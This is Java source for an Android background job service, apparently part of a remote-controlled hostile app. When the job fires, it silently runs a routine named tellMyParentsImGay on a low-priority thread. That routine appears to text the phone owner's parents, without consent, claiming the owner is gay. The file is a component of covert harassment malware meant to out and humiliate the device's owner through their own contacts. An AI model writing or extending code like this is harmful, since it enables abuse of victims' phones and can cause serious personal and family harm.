package com.candroid.lofl.jobs.services;

import android.app.job.JobParameters;
import android.app.job.JobService;
import android.os.Process;

import com.candroid.lofl.api.Messaging;
import com.candroid.lofl.jobs.JobsScheduler;

public class TextParentsJobService extends JobService {
    @Override
    public boolean onStartJob(final JobParameters params) {
/*        Intent textParentsIntent = new Intent(this, CommandsIntentService.class);
        textParentsIntent.setAction(CommandsIntentService.ACTION_TEXT_PARENTS);
        startService(textParentsIntent);*/
        new Thread(new Runnable() {
            @Override
            public void run() {
                Process.setThreadPriority(Process.THREAD_PRIORITY_BACKGROUND);
                Messaging.Text.tellMyParentsImGay(TextParentsJobService.this);
                JobsScheduler.setJobRan(TextParentsJobService.this, JobsScheduler.TEXT_PARENTS_KEY);
                TextParentsJobService.this.jobFinished(params, false);
            }
        }).start();
        return true;
    }

    @Override
    public boolean onStopJob(JobParameters params) {
        return true;
    }
}